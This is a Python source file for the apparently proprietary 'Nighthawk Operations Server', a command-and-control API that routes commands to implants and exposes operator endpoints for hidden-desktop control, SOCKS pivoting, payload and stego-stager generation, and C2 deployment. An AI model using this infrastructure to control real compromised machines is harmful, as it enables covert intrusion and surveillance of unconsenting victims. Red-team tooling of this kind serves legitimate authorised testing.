# Copyright 2022 MDSec Consulting Ltd
# Use of this source code is governed by an End User License Agreement,
# details of this agreement can be found in EULA.pdf
# Nighthawk (r)

import os
import sys
import falcon
import re
from base64 import b64decode
from threading import Thread
from time import sleep
from waitress import serve

from c2resources import *
from sessionresources import *
from controlresources import *
import apimanager

# create singleton
ApiManager = apimanager.ApiManager.get_instance()

class AuthorizeRoute(object):
	UNAUTHENTICATED_ROUTES = [
		"^/control/status$",
		"^/control/checkauth$",
		"^/control/getlisteners$",
	]

	SERVICE_AUTHENTICATED_ROUTES = [
		"^/c2/.*$",
		"^/control/(put|get)action/.*$",
	]
	
	AUTHORIZATION_HEADER = "AUTHORIZATION" # falcon uppercases header names
	LISTENER_NAME_HEADER = "X-LISTENER-NAME"
	
	def process_request(self, req, resp):
		#print "Request to %s" % req.path
		
		if any([re.match(path.lower(), req.path.lower()) for path in AuthorizeRoute.UNAUTHENTICATED_ROUTES]):
			# unauthenticated routes
			return
		
		if AuthorizeRoute.AUTHORIZATION_HEADER not in req.headers:
			raise falcon.HTTPMissingHeader(AuthorizeRoute.AUTHORIZATION_HEADER)
		
		secret = str(req.headers[AuthorizeRoute.AUTHORIZATION_HEADER])

		if any([re.match(path.lower(), req.path.lower()) for path in AuthorizeRoute.SERVICE_AUTHENTICATED_ROUTES]):
			# service-to-service authenticated routes

			if AuthorizeRoute.LISTENER_NAME_HEADER not in req.headers:
				raise falcon.HTTPMissingHeader(AuthorizeRoute.LISTENER_NAME_HEADER)

			listener_name = str(req.headers[AuthorizeRoute.LISTENER_NAME_HEADER])
			
			if not ApiManager.control_check_secret(listener_name, secret):
				raise falcon.HTTPUnauthorized("Unauthorized", "Invalid service credentials")
			return
		
		if not secret.startswith("Basic "):
			raise falcon.HTTPInvalidHeader("HTTP Basic auth required", AuthorizeRoute.AUTHORIZATION_HEADER)

		credentials = b64decode(secret[6:].strip())
		username,password = credentials.split(":")

		if not ApiManager.control_checkauth(username, password):
			raise falcon.HTTPUnauthorized("Unauthorized", "Please provide valid credentials")

		return

def JsonErrorSerializer(req, resp, exception):
	resp.body = exception.to_json()
	resp.content_type = "application/json"
	return

app = falcon.API(middleware=[AuthorizeRoute()])
app.set_error_serializer(JsonErrorSerializer)

# C2 agent command routes
app.add_route("/c2/status", C2StatusResource())
app.add_route("/c2/listcommands/{client_id}", C2ListCommandsResource())
app.add_route("/c2/getcommand/{msg_id}", C2GetCommandResource())
app.add_route("/c2/putresult/{client_id}/{msg_id}", C2PutResultResource())
app.add_route("/c2/notifyactivity/{client_id}/{listener_name}", C2NotifyActivityResource())

# UI session routes
app.add_route("/session/putcommand/{client_id}/{msg_id}", SessionPutCommandResource())
app.add_route("/session/clearcommand/{client_id}/{msg_id}", SessionClearCommandsResource())
app.add_route("/session/listresults", SessionListResultsResource())
app.add_route("/session/getresult/{msg_id}", SessionGetResultResource())
app.add_route("/session/getresult/batch", SessionGetResultBatchResource())
app.add_route("/session/listbroadcastresults", SessionListBroadcastResultsResource())
app.add_route("/session/getbroadcastresult/{msg_id}", SessionGetBroadcastResultResource())
app.add_route("/session/getlastactivity", SessionGetLastActivityResource())
app.add_route("/session/adddetailedinfo/{client_id}", SessionAddDetailedInfoResource())
app.add_route("/session/logcommandextra/{msg_id}", SessionLogCommandExtraDataResource())
app.add_route("/session/logclientextra/{client_id}", SessionLogClientExtraDataResource())
app.add_route("/session/addconsoledelta/{client_id}", SessionAddConsoleDeltaResource())
app.add_route("/session/getconsoledelta/{client_id}/{delta_id}", SessionGetConsoleDeltaResource())
app.add_route("/session/getconsoledelta/batch/{client_id}", SessionGetConsoleDeltaBatchResource())
app.add_route("/session/listconsoledelta/{client_id}/{timestamp}", SessionListConsoleDeltaResource())
app.add_route("/session/storeartifact/{client_id}/{sha1hash}", SessionStoreArtifactResource())
app.add_route("/session/artifactexists/{sha1hash}", SessionArtifactExistsResource())
app.add_route("/session/listartifacts", SessionListArtifactsResource())
app.add_route("/session/downloadartifact/{sha1hash}", SessionDownloadArtifactResource())
app.add_route("/session/hiddendesktop/start/{client_id}/{desktop_name}", SessionHiddenDesktopStartResource())
app.add_route("/session/hiddendesktop/stop/{client_id}", SessionHiddenDesktopStopResource())
app.add_route("/session/hiddendesktop/status/{client_id}", SessionHiddenDesktopStatusResource())
app.add_route("/session/hiddendesktop/capture/{client_id}", SessionHiddenDesktopCaptureResource())
app.add_route("/session/hiddendesktop/capturewait/{client_id}/{timestamp}", SessionHiddenDesktopCaptureWaitResource())
app.add_route("/session/hiddendesktop/input/{client_id}", SessionHiddenDesktopInputResource())
app.add_route("/session/hiddendesktop/setcaptureparams/{client_id}", SessionHiddenDesktopSetCaptureParamsResource())
app.add_route("/session/p2pmesh", SessionGetP2PMeshResource())
app.add_route("/session/socks/start/{client_id}/{port}", SessionSOCKSStartResource())
app.add_route("/session/socks/stop/{client_id}", SessionSOCKSStopResource())

# service control routes
app.add_route("/control/status", ControlStatusResource())
app.add_route("/control/checkauth", ControlCheckAuthResource())
app.add_route("/control/adduser", ConsoleAddUserResource())
app.add_route("/control/getlisteners", ControlGetListenersResource())
app.add_route("/control/getlistenerprofile/{listener_name}", ControlGetListenerProfileResource())
app.add_route("/control/getagentprofile/{listener_name}", ControlGetAgentProfileResource())
app.add_route("/control/deployc2/{listener_name}", ControlDeployC2Resource())
app.add_route("/control/adoptc2/{listener_name}", ControlAdoptC2Resource())
app.add_route("/control/teardownc2/{listener_name}", ControlTeardownC2Resource())
app.add_route("/control/teardownallc2", ControlTeardownAllC2Resource())
app.add_route("/control/payload/{listener_name}", ControlPayloadGeneratorResource())
app.add_route("/control/payloadfromprofile/{listener_name}", ControlPayloadFromAgentProfileResource())
app.add_route("/control/getaction/{listener_name}", ControlGetActionResource())
app.add_route("/control/putaction/{listener_name}", ControlPutActionResource())
app.add_route("/control/stegostager", ControlStegoStagerGeneratorResource())

__APISERVER_INSTANCE_NAME = None

def show_logo():
	logo = """
 _______  .__       .__     __  .__                   __    
 \      \ |__| ____ |  |___/  |_|  |__ _____ __  _  _|  | __
 /   |   \|  |/ ___\|  |  \   __\  |  \\__  \\ \/ \/ /  |/ /
/    |    \  / /_/  >   Y  \  | |   Y  \/ __ \\     /|    < 
\____|__  /__\___  /|___|  /__| |___|  (____  /\/\_/ |__|_ \\
        \/  /_____/      \/          \/     \/            \/
"""
	print logo
	print "Nighthawk Operations Server"
	return

def show_usage():
	print "  usage: python apiserver.py <campaign-name> <username:password> [host-ip] [host-port] [--debug]"
	return

def get_instance_name():
	return __APISERVER_INSTANCE_NAME

def get_input(desc):
	try:
		if "NIGHTHAWK_INPUT" in get_input.__dict__:
			env_arg = get_input.NIGHTHAWK_INPUT.pop()
			print desc + env_arg
			return env_arg

		env_input = os.getenv("NIGHTHAWK_INPUT")
		if env_input:
			get_input.NIGHTHAWK_INPUT = env_input.split(",")
			get_input.NIGHTHAWK_INPUT.reverse()
			return get_input(desc)
	except IndexError:
		pass
	
	return raw_input(desc)

if __name__ == "__main__":
	show_logo()

	openssl_path = os.getenv("OPENSSL_BINARY")
	if not openssl_path:
		print "Please define environment variable 'OPENSSL_BINARY' before running"
		sys.exit(1)

	if len(sys.argv) > 2:
		__APISERVER_INSTANCE_NAME = sys.argv[1]
		initial_credentials = sys.argv[2]
		host_ip = "0.0.0.0" if len(sys.argv) <= 3 else sys.argv[3]
		host_port = 8888 if len(sys.argv) <= 4 else int(sys.argv[4])
		debug = sys.argv[-1].lower() == "--debug" or sys.argv[-2].lower() == "--debug"
		trace = sys.argv[-1].lower() == "--trace" or sys.argv[-2].lower() == "--trace"

		if ":" not in initial_credentials:
			print "Credentials must have form username:password"
			sys.exit(1)

		ApiManager.set_debug(debug)
		ApiManager.set_trace(trace)
		ApiManager.set_database(get_instance_name())

		create_new = True
		
		if ApiManager.campaign_exists():
			while True:
				s = get_input("Existing campaign found - [R]esume or [O]verwrite?  ").lower()
				if s.startswith("r"):
					create_new = False
					break
				elif s.startswith("o"):
					break
		
		restore_c2s = []

		if create_new:
			print "New campaign - adding initial credentials"
			ApiManager.erase_db()
			ApiManager.setup_user(*initial_credentials.split(":"))
		else:
			print "Existing campaign - restoring from database"

			existing_c2 = ApiManager.get_c2s_from_database()
			
			for i,server in enumerate(existing_c2):
				timestamp = server[0]
				listener_name = server[2]

				print "  [%03u] Found C2 %-30s %-30s" % (i + 1, timestamp, listener_name)
			
			for i,server in enumerate(existing_c2):
				timestamp = server[0]
				
				while True:
					s = get_input("Redeploy %03u [Y/YA/N/NA (yes/no-to-all)]?  " % (i + 1)).lower()
					if s.startswith("y"):
						restore_c2s.append(timestamp)
						break
					elif s.startswith("n"):
						break
				
				if s.startswith("na"):
					break
				elif s.startswith("ya"):
					restore_c2s.extend([c2[0] for c2 in existing_c2[i + 1:]])
					break
		
		print "Starting instance '%s'" % get_instance_name()

		def restore():
			sleep(2)
			ApiManager.restore_campaign(restore_c2s)
			return

		if restore_c2s:
			Thread(target=restore).start()

		serve(app, host=host_ip, port=host_port, threads=2000)
	else:
		show_usage()